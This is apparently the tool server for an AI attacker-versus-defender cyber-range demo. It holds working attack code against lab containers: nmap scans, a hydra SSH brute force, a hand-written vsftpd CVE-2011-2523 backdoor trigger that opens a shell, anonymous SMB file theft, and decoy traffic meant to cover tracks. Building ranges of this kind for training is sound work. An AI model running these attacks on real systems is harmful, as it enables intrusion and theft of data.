"""
Constrained attacker/defender action menu for the network-intrusion
scenario -- the "hands" half of the brain/hands split in
specs/network-intrusion.md. Unlike scenarios/agentic/tool-api (custom
Python HTTP-client tricks against a web app), every attacker action here
shells out to a REAL, industry-standard tool (nmap, hydra, smbclient)
against real target containers, or performs a real hand-written protocol
interaction (the vsftpd backdoor trigger) -- not a simulated result.

Called by the host-side brain loops (../brain/), never directly by an LLM --
a model only ever sees this menu's JSON schema (GET /tools) and picks a
name + params; this process does the actual work and is the only thing on
cyberrange_net that ever touches the targets. See specs/architecture.md's
"Local LLM runtime" section for why the LLM call itself happens on the host.
"""
import json
import os
import re
import socket
import subprocess
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

EVENTS_API = os.environ.get("EVENTS_API", "http://range-dashboard:8080/events")
PORT = int(os.environ.get("PORT", "9100"))
SSH_HOST = os.environ.get("SSH_HOST", "ssh-host")
FTP_HOST = os.environ.get("FTP_HOST", "ftp-host")
SMB_HOST = os.environ.get("SMB_HOST", "smb-host")
EVENTS_LOG_PATH = os.environ.get("EVENTS_LOG_PATH", "/data/events.jsonl")
SERVICE_LOG_DIR = os.environ.get("SERVICE_LOG_DIR", "/logs")
WORDLIST = os.path.join(os.path.dirname(__file__), "wordlist.txt")
SSH_USER = "svc-backup"  # the one weak-password account seeded on ssh-host

LOCK = threading.Lock()
SESSION = {
    "known_hosts": {},  # ip -> hostname, from network_sweep
    "scanned_ports": {},  # ip -> [ports]
    "blocked": False,
    "times_blocked": 0,
    "defender_signals": 0,
    "acknowledged_alerts": [],
    "tried_smb_files": {},
    "decoy_probes_sent": 0,
    "ssh_credentials": {},  # ip -> cracked password, from ssh_bruteforce
}


def post_event(**ev):
    ev = {k: v for k, v in ev.items() if v is not None}
    data = json.dumps(ev).encode()
    req = urllib.request.Request(
        EVENTS_API, data=data, headers={"Content-Type": "application/json"}, method="POST"
    )
    try:
        urllib.request.urlopen(req, timeout=5)
    except urllib.error.URLError as e:
        print(f"[warn] could not post event: {e}", flush=True)
    print(f"  >> [{ev.get('actor')}] {ev.get('description')}", flush=True)


def own_subnet():
    """cyberrange_net's real /24, computed at runtime, never hardcoded (the
    Docker-assigned subnet isn't fixed across recreations). Resolves a
    known target hostname (ssh-host), NOT this container's own hostname --
    tool-api is dual-homed (cyberrange_net + cyberrange_view, see
    docker-compose.yml), and resolving its own hostname non-deterministically
    picked up the wrong network's IP in rehearsal 2026-08-24, causing a real
    sweep of the wrong subnet entirely (0 hosts found). ssh-host is only
    ever on cyberrange_net, so its resolved IP is unambiguous."""
    ip = socket.gethostbyname(SSH_HOST)
    parts = ip.split(".")
    return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"


def run(cmd, timeout=60):
    """Real subprocess execution -- every attacker tool below shells out
    through this, no simulated tool output anywhere."""
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "timed out"


def _blocked_result(tool_name, params):
    post_event(
        scenario="network-intrusion", actor="attacker", step_id=f"{tool_name}-blocked",
        description=f"Attempted {tool_name.replace('_', ' ')}, but the defender has blocked this source.",
        severity="low", reasoning=params.get("reasoning"),
    )
    return {"success": False, "summary": "Blocked by the defender -- this source has been cut off."}


# ---- Attacker tools ("hands") ----

def tool_network_sweep(params):
    subnet = own_subnet()
    code, out, err = run(["nmap", "-sn", "-T4", subnet], timeout=30)
    ips = re.findall(r"Nmap scan report for (?:\S+ \()?(\d+\.\d+\.\d+\.\d+)\)?", out)
    hosts = {}
    for ip in ips:
        try:
            name = socket.gethostbyaddr(ip)[0]
        except (socket.herror, socket.gaierror):
            name = None
        hosts[ip] = name
    with LOCK:
        SESSION["known_hosts"].update(hosts)
    post_event(
        scenario="network-intrusion", actor="attacker", step_id="network-sweep", attack_technique_id="T1018",
        description=f"Swept {subnet} with a real nmap ping scan -- {len(hosts)} host(s) responded.",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": f"{len(hosts)} host(s) found.", "hosts": hosts}


def tool_port_scan_host(params):
    ip = params.get("ip")
    if not ip:
        return {"success": False, "summary": "ip is required -- run network_sweep first to find one."}
    code, out, err = run(["nmap", "-sV", "-T4", "--top-ports", "50", ip], timeout=60)
    open_ports = re.findall(r"(\d+)/tcp\s+open\s+(\S+)", out)
    with LOCK:
        SESSION["scanned_ports"][ip] = open_ports
    port_summary = ", ".join(f"{p}/{svc}" for p, svc in open_ports) if open_ports else "nothing open"
    post_event(
        scenario="network-intrusion", actor="attacker", step_id="port-scan-host", attack_technique_id="T1046",
        description=f"Real nmap service scan on {ip} -- {port_summary}.",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": port_summary, "open_ports": open_ports}


def tool_ssh_bruteforce(params):
    if SESSION["blocked"]:
        return _blocked_result("ssh_bruteforce", params)
    ip = params.get("ip") or SSH_HOST
    code, out, err = run(
        ["hydra", "-l", SSH_USER, "-P", WORDLIST, "-t", "4", "-f", f"ssh://{ip}"],
        timeout=90,
    )
    m = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", out)
    if m:
        password = m.group(2)
        with LOCK:
            SESSION["ssh_credentials"][ip] = password
        post_event(
            scenario="network-intrusion", actor="attacker", step_id="ssh-bruteforce-success",
            attack_technique_id="T1110.001", severity="high", legal_ref="cfaa-1030a2",
            description=f"Real hydra brute-force run against {ip} found a working password for {SSH_USER} after trying the wordlist.",
            reasoning=params.get("reasoning"),
        )
        return {"success": True, "summary": f"Cracked {SSH_USER}'s password: {password}. Use ssh_shell to actually log in and enumerate the host -- no need to run this again.", "username": SSH_USER, "password": password}
    post_event(
        scenario="network-intrusion", actor="attacker", step_id="ssh-bruteforce-failed",
        attack_technique_id="T1110.001", severity="low",
        description=f"Real hydra brute-force run against {ip} tried the whole wordlist -- no working password found.",
        reasoning=params.get("reasoning"),
    )
    return {"success": False, "summary": "No working password found in the wordlist."}


def tool_ssh_shell(params):
    if SESSION["blocked"]:
        return _blocked_result("ssh_shell", params)
    ip = params.get("ip") or SSH_HOST
    password = SESSION["ssh_credentials"].get(ip)
    if not password:
        return {"success": False, "summary": f"No cracked credentials for {ip} yet -- run ssh_bruteforce first."}

    cmd_str = "whoami; id; uname -a; hostname"
    code, out, err = run(
        [
            "sshpass", "-p", password, "ssh",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=8",
            f"{SSH_USER}@{ip}", cmd_str,
        ],
        timeout=20,
    )
    if code != 0:
        post_event(
            scenario="network-intrusion", actor="attacker", step_id="ssh-shell-failed",
            attack_technique_id="T1021.004", severity="low",
            description=f"Real SSH login to {ip} with the cracked password failed (exit {code}).",
            reasoning=params.get("reasoning"),
        )
        return {"success": False, "summary": f"SSH login failed: {err.strip() or out.strip()}"}

    post_event(
        scenario="network-intrusion", actor="attacker", step_id="ssh-shell-success",
        attack_technique_id="T1021.004", severity="critical", legal_ref="cfaa-1030a2",
        description=f"Logged into {ip} over real SSH with the cracked password and ran real commands -- {out.strip()[:300]}",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": out.strip()}


def tool_vsftpd_backdoor(params):
    if SESSION["blocked"]:
        return _blocked_result("vsftpd_backdoor", params)
    ip = params.get("ip") or FTP_HOST
    try:
        ctrl = socket.create_connection((ip, 21), timeout=8)
        ctrl.recv(256)
        ctrl.sendall(b"USER backdoor:)\r\n")
        ctrl.recv(256)
        ctrl.sendall(b"PASS x\r\n")
        ctrl.recv(256)
    except OSError as e:
        return {"success": False, "summary": f"Could not reach {ip}:21 -- {e}"}

    time.sleep(1.5)  # real: the backdoor listener takes a moment to come up
    try:
        shell = socket.create_connection((ip, 6200), timeout=8)
        shell.settimeout(3)
        commands_run = []
        for cmd in ("whoami", "id", "uname -a"):
            shell.sendall((cmd + "\n").encode())
            time.sleep(0.4)
            try:
                out = shell.recv(500).decode(errors="replace")
            except socket.timeout:
                out = ""
            # Strip real shell-prompt/tty noise from the raw output --
            # genuinely there in a real interactive shell (no pty allocated),
            # but pointless bloat once it's headed into the model's context
            # window every subsequent turn. Rehearsal 2026-08-24: this
            # bloat contributed to a real turn timeout later in the run.
            clean = re.sub(r"/bin/sh: can't access tty; job control turned off\n?", "", out)
            clean = re.sub(r"/app #\s*", "", clean).strip()
            commands_run.append({"cmd": cmd, "output": clean})
        shell.close()
    except OSError as e:
        ctrl.close()
        post_event(
            scenario="network-intrusion", actor="attacker", step_id="vsftpd-backdoor-failed",
            attack_technique_id="T1210", severity="low",
            description=f"Sent the backdoor trigger to {ip}, but the shell on port 6200 never came up ({e}).",
            reasoning=params.get("reasoning"),
        )
        return {"success": False, "summary": f"Trigger sent but shell connection failed: {e}"}

    ctrl.close()
    summary = "; ".join(f"{c['cmd']} -> {c['output']}" for c in commands_run)
    post_event(
        scenario="network-intrusion", actor="attacker", step_id="vsftpd-backdoor-success",
        attack_technique_id="T1210", severity="critical", legal_ref="cfaa-1030a2",
        description=f"Triggered the real CVE-2011-2523 backdoor on {ip} and got a real command shell -- {summary}",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": summary, "commands": commands_run}


def tool_smb_enum(params):
    ip = params.get("ip") or SMB_HOST
    code, out, err = run(["smbclient", "-L", f"//{ip}", "-N", "-g"], timeout=20)
    shares = re.findall(r"^Disk\|([^|]+)\|", out, re.MULTILINE)

    # Also list files in each share found -- real smbclient `ls`, so
    # smb_download has an actual filename to work with instead of guessing.
    files_by_share = {}
    for share in shares:
        code, out, err = run(["smbclient", f"//{ip}/{share}", "-N", "-c", "ls"], timeout=15)
        files = re.findall(r"^\s+(\S[^\n]*?)\s+[AHDNRS]+\s+\d+\s", out, re.MULTILINE)
        files_by_share[share] = [f for f in files if f not in (".", "..")]

    post_event(
        scenario="network-intrusion", actor="attacker", step_id="smb-enum", attack_technique_id="T1135",
        description=(
            f"Real smbclient anonymous share listing on {ip} -- "
            + (f"shares: {', '.join(shares)}; files: {files_by_share}" if shares else "nothing (or auth required).")
        ),
        reasoning=params.get("reasoning"),
    )
    return {"success": bool(shares), "summary": f"Shares and files: {files_by_share}", "shares": shares, "files_by_share": files_by_share}


def tool_smb_download(params):
    if SESSION["blocked"]:
        return _blocked_result("smb_download", params)
    ip = params.get("ip") or SMB_HOST
    share = params.get("share") or "public"
    filename = params.get("file")
    if not filename:
        return {"success": False, "summary": "file is required -- run smb_enum first, then list the share to find one."}

    key = f"{ip}/{share}/{filename}"
    local_path = f"/tmp/{filename.replace('/', '_')}"
    code, out, err = run(
        ["smbclient", f"//{ip}/{share}", "-N", "-c", f'get "{filename}" "{local_path}"'],
        timeout=20,
    )
    if not os.path.exists(local_path):
        post_event(
            scenario="network-intrusion", actor="attacker", step_id="smb-download-failed", attack_technique_id="T1039",
            severity="low",
            description=f"Tried to pull {filename} from //{ip}/{share} -- failed ({out.strip() or err.strip()}).",
            reasoning=params.get("reasoning"),
        )
        return {"success": False, "summary": f"Download failed: {out.strip() or err.strip()}"}

    with open(local_path) as f:
        content = f.read()
    os.remove(local_path)
    with LOCK:
        SESSION["tried_smb_files"][key] = True
    post_event(
        scenario="network-intrusion", actor="attacker", step_id="smb-download-success",
        attack_technique_id="T1039", severity="high", legal_ref="cfaa-1030a2-misconfig",
        description=f"Downloaded {filename} from //{ip}/{share} with zero credentials -- contents: {content[:200].strip()}",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": f"Downloaded {filename} ({len(content)} bytes).", "content": content[:1000]}


def tool_cover_tracks(params):
    ip = params.get("ip") or SSH_HOST
    count = 30
    for i in range(count):
        try:
            s = socket.create_connection((ip, 22), timeout=1)
            s.close()
        except OSError:
            pass
    with LOCK:
        SESSION["decoy_probes_sent"] += count
    post_event(
        scenario="network-intrusion", actor="attacker", step_id="cover-tracks-attempt", attack_technique_id="T1070",
        severity="medium",
        description=(
            f"Sent {count} decoy connection attempts at {ip} to bury real activity in noise. "
            "This session never showed signs of the kind of privileged host access real log tampering "
            "would need -- this is what's left to try instead."
        ),
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": f"Sent {count} decoy connection attempts."}


# ---- Defender tools ("hands") ----

def tool_check_alerts(params):
    try:
        with urllib.request.urlopen(EVENTS_API, timeout=5) as resp:
            data = json.loads(resp.read().decode())
    except (urllib.error.URLError, json.JSONDecodeError):
        return {"success": False, "summary": "Could not reach the event stream."}
    events = data.get("events", [])
    alerts = [e for e in events if e.get("actor") == "defender" and str(e.get("step_id", "")).startswith("detect-")]
    with LOCK:
        seen = set(SESSION["acknowledged_alerts"])
        new_alerts = [a for a in alerts if a.get("step_id") not in seen]
        SESSION["acknowledged_alerts"] = list(seen | {a.get("step_id") for a in new_alerts})
    return {"success": True, "alerts": new_alerts, "summary": f"{len(new_alerts)} new alert(s) since last check."}


def tool_flag_session(params):
    with LOCK:
        SESSION["defender_signals"] += 1
    post_event(
        scenario="network-intrusion", actor="defender", step_id="session-flagged", severity="medium",
        description="Flagged this source as suspicious for follow-up review.",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": "Flagged."}


MIN_SIGNALS_BEFORE_BLOCK = 2


def tool_block_attacker(params):
    # Unlike scenarios/agentic (a session-token revoke the underlying app
    # vulnerability makes trivially recoverable), a network-level block on
    # a source IP is genuinely more final -- real firewalls do stop further
    # access from that source. Kept honest: represents a defensive
    # access-control response (e.g. a firewall rule), not literal system
    # remediation -- this doesn't patch the SSH weak password, the vsftpd
    # backdoor, or the SMB misconfiguration, it just stops this source from
    # reaching them. Same defender-signals gate as scenarios/agentic (real
    # SOC restraint, not a hair-trigger) -- see tool-api's
    # MIN_SIGNALS_BEFORE_BLOCK there for the rehearsal finding that
    # motivated this.
    if SESSION["defender_signals"] < MIN_SIGNALS_BEFORE_BLOCK:
        with LOCK:
            SESSION["defender_signals"] += 1
        post_event(
            scenario="network-intrusion", actor="defender", step_id="session-flagged", severity="medium",
            description="Flagged this source -- not enough evidence yet to justify a full block on one alert alone.",
            reasoning=params.get("reasoning"),
        )
        return {"success": True, "summary": "Not enough evidence yet to block -- flagged instead."}

    with LOCK:
        SESSION["blocked"] = True
        SESSION["times_blocked"] += 1
    post_event(
        scenario="network-intrusion", actor="defender", step_id="attacker-blocked", severity="high",
        description="Blocked this source at the network level -- further exploitation attempts from it will be refused. This is access control, not remediation: the underlying weaknesses are still there.",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": "Source blocked."}


def tool_escalate_to_soc(params):
    with LOCK:
        SESSION["defender_signals"] += 1
    post_event(
        scenario="network-intrusion", actor="defender", step_id="escalated-to-soc", severity="medium",
        description="Escalated this incident to a human SOC analyst for follow-up.",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": "Escalated."}


# ---- End-of-run incident report -- deterministic, not LLM-generated. See
# scenarios/agentic/tool-api/server.py's build_incident_report docstring
# for why (same "never fabricate a finding" bar applies here).

def _read_jsonl(path):
    if not os.path.exists(path):
        return []
    rows = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                rows.append(json.loads(line))
            except json.JSONDecodeError:
                continue
    return rows


def _count_real_log_lines():
    total = 0
    ftp_log = os.path.join(SERVICE_LOG_DIR, "ftp.jsonl")
    if os.path.exists(ftp_log):
        total += sum(1 for _ in open(ftp_log))
    ssh_log = os.path.join(SERVICE_LOG_DIR, "ssh-auth.log")
    if os.path.exists(ssh_log):
        total += sum(1 for _ in open(ssh_log))
    try:
        for name in os.listdir(SERVICE_LOG_DIR):
            if name.startswith("smb-") and name.endswith(".log"):
                total += sum(1 for _ in open(os.path.join(SERVICE_LOG_DIR, name), errors="replace"))
    except OSError:
        pass
    return total


def build_incident_report():
    events = _read_jsonl(EVENTS_LOG_PATH)
    confirmed = [e for e in events if e.get("legal_ref")]

    lines = ["INCIDENT REPORT", f"{len(confirmed)} confirmed finding(s) with a legal citation."]
    if not confirmed:
        lines.append(
            "No confirmed malicious activity was identified during this session. "
            "This reflects an absence of confirmed findings -- it is not a guarantee "
            "that nothing happened, only that nothing was independently confirmed."
        )
    else:
        for e in confirmed:
            lines.append(f"- [{e.get('attack_technique_id', '?')}] {e.get('description', '')} (statute ref: {e.get('legal_ref')})")

    total_log_lines = _count_real_log_lines()
    lines.append("")
    lines.append(
        f"Real service logs (SSH, FTP, SMB): {total_log_lines} line(s) recorded across all three hosts. "
        f"Decoy connection attempts known to have been sent by this run: {SESSION.get('decoy_probes_sent', 0)}."
    )
    if SESSION.get("decoy_probes_sent", 0) > 0:
        lines.append(
            "NOTE: decoy traffic was sent during this session -- the findings confirmed above were "
            "independently detected before this report was compiled and are unaffected, but the raw "
            "logs should not be assumed fully reconstructed."
        )
    else:
        lines.append("No decoy/noise traffic was observed in this session.")

    return "\n".join(lines), confirmed


def tool_investigate_incident():
    report_text, confirmed = build_incident_report()

    ts = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    backed_up = []
    sources = [("events", EVENTS_LOG_PATH)]
    ftp_log = os.path.join(SERVICE_LOG_DIR, "ftp.jsonl")
    ssh_log = os.path.join(SERVICE_LOG_DIR, "ssh-auth.log")
    sources.append(("ftp-log", ftp_log))
    sources.append(("ssh-log", ssh_log))
    for label, src in sources:
        if os.path.exists(src):
            dest = f"/evidence/evidence-network-intrusion-{label}-{ts}.jsonl"
            try:
                import shutil
                shutil.copyfile(src, dest)
                backed_up.append(dest)
            except OSError as e:
                print(f"[warn] could not back up {src}: {e}", flush=True)

    report_text += "\n\n" + (
        "Evidence preserved for trial: " + ", ".join(backed_up)
        if backed_up else
        "No evidence files were available to back up."
    )

    post_event(
        scenario="network-intrusion", actor="defender", step_id="incident-report",
        severity="critical" if confirmed else "low",
        description=report_text,
    )
    return {"success": True, "report": report_text, "confirmed_count": len(confirmed), "backed_up": backed_up}


_REASONING_PARAM = {"type": "string", "description": "One short sentence on why you're taking this action, for the audience watching."}

TOOLS = {
    "network_sweep": {
        "role": "attacker", "handler": tool_network_sweep,
        "description": "Real nmap ping sweep of the local subnet to discover which hosts are actually up. A real recon step, worth doing first.",
        "properties": {},
    },
    "port_scan_host": {
        "role": "attacker", "handler": tool_port_scan_host,
        "description": "Real nmap service scan against one specific host (found via network_sweep) to see what's actually listening.",
        "properties": {"ip": {"type": "string", "description": "The host's IP, from network_sweep's results."}},
    },
    "ssh_bruteforce": {
        "role": "attacker", "handler": tool_ssh_bruteforce,
        "description": "Real hydra password-brute-force run against a host's SSH service using a common-password wordlist. May or may not find a working password -- that's a real, honest outcome either way. Only needs to be run once per host -- use ssh_shell afterward to actually do something with cracked credentials.",
        "properties": {"ip": {"type": "string", "description": "The SSH host's IP."}},
    },
    "ssh_shell": {
        "role": "attacker", "handler": tool_ssh_shell,
        "description": "Actually log in over real SSH using credentials already cracked by ssh_bruteforce, and run real enumeration commands (whoami, id, uname -a, hostname). Requires ssh_bruteforce to have succeeded on this host first.",
        "properties": {"ip": {"type": "string", "description": "The SSH host's IP -- must match a host ssh_bruteforce already cracked."}},
    },
    "vsftpd_backdoor": {
        "role": "attacker", "handler": tool_vsftpd_backdoor,
        "description": "Trigger the real CVE-2011-2523 vsftpd backdoor on an FTP host and, if it works, run a few real enumeration commands through the resulting shell.",
        "properties": {"ip": {"type": "string", "description": "The FTP host's IP."}},
    },
    "smb_enum": {
        "role": "attacker", "handler": tool_smb_enum,
        "description": "Real smbclient anonymous share listing against a host -- see what's shared with no credentials.",
        "properties": {"ip": {"type": "string", "description": "The SMB host's IP."}},
    },
    "smb_download": {
        "role": "attacker", "handler": tool_smb_download,
        "description": "Real smbclient download of a specific file from a specific share (use smb_enum first to find share names, then guess or infer a filename).",
        "properties": {
            "ip": {"type": "string", "description": "The SMB host's IP."},
            "share": {"type": "string", "description": "The share name, e.g. public."},
            "file": {"type": "string", "description": "The filename to download."},
        },
    },
    "cover_tracks": {
        "role": "attacker", "handler": tool_cover_tracks,
        "description": "Send a burst of decoy connection attempts to bury real activity in noise. Worth considering once you've accomplished your main goals.",
        "properties": {"ip": {"type": "string", "description": "Which host to send decoy traffic at."}},
    },
    "check_alerts": {
        "role": "defender", "handler": tool_check_alerts,
        "description": "Check for new detection alerts fired by the independent log-watching detector since you last checked.",
        "properties": {},
    },
    "flag_session": {
        "role": "defender", "handler": tool_flag_session,
        "description": "Flag this source as suspicious for follow-up review, without cutting off its access yet.",
        "properties": {},
    },
    "block_attacker": {
        "role": "defender", "handler": tool_block_attacker,
        "description": "Block this source at the network level. This is access control, not remediation -- it stops further attempts from this source, but doesn't fix the underlying weak SSH password, vsftpd backdoor, or SMB misconfiguration. Requires having already flagged/escalated at least twice -- calling this too early just flags instead.",
        "properties": {},
    },
    "escalate_to_soc": {
        "role": "defender", "handler": tool_escalate_to_soc,
        "description": "Escalate this incident to a human SOC analyst instead of, or in addition to, taking automated action.",
        "properties": {},
    },
}

for _name, _tool in TOOLS.items():
    _props = dict(_tool["properties"])
    _props["reasoning"] = _REASONING_PARAM
    _tool["schema"] = {
        "type": "function",
        "function": {
            "name": _name,
            "description": _tool["description"],
            "parameters": {
                "type": "object",
                "properties": _props,
                "required": list(_tool["properties"].keys()) + ["reasoning"],
            },
        },
    }


class Handler(BaseHTTPRequestHandler):
    def _send_json(self, obj, status=200):
        body = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == "/health":
            self._send_json({"ok": True})
        elif self.path.startswith("/tools"):
            role = None
            if "?" in self.path:
                query = self.path.split("?", 1)[1]
                params = dict(p.split("=", 1) for p in query.split("&") if "=" in p)
                role = params.get("role")
            schemas = [t["schema"] for t in TOOLS.values() if role in (None, t["role"])]
            self._send_json({"tools": schemas})
        elif self.path == "/session":
            self._send_json(dict(SESSION))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/reset":
            with LOCK:
                SESSION.update({
                    "known_hosts": {}, "scanned_ports": {}, "blocked": False, "times_blocked": 0,
                    "defender_signals": 0, "acknowledged_alerts": [], "tried_smb_files": {},
                    "decoy_probes_sent": 0, "ssh_credentials": {},
                })
            self._send_json({"ok": True})
            return
        if self.path == "/investigate":
            try:
                result = tool_investigate_incident()
            except Exception as e:
                print(f"[error] investigate_incident raised: {e}", flush=True)
                result = {"success": False, "summary": f"Investigation failed: {e}"}
            self._send_json(result)
            return
        if not self.path.startswith("/tools/"):
            self.send_response(404)
            self.end_headers()
            return
        name = self.path[len("/tools/"):]
        tool = TOOLS.get(name)
        if not tool:
            self._send_json({"error": f"unknown tool '{name}'"}, 404)
            return
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length) if length else b""
        try:
            params = json.loads(raw) if raw else {}
        except json.JSONDecodeError:
            self._send_json({"error": "bad json"}, 400)
            return
        try:
            result = tool["handler"](params)
        except Exception as e:  # a live demo can't 500 into dead air
            print(f"[error] tool '{name}' raised: {e}", flush=True)
            result = {"success": False, "summary": f"Tool '{name}' errored: {e}"}
        self._send_json(result)

    def log_message(self, fmt, *args):
        pass


if __name__ == "__main__":
    server = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    print(f"tool-api listening on :{PORT}", flush=True)
    server.serve_forever()
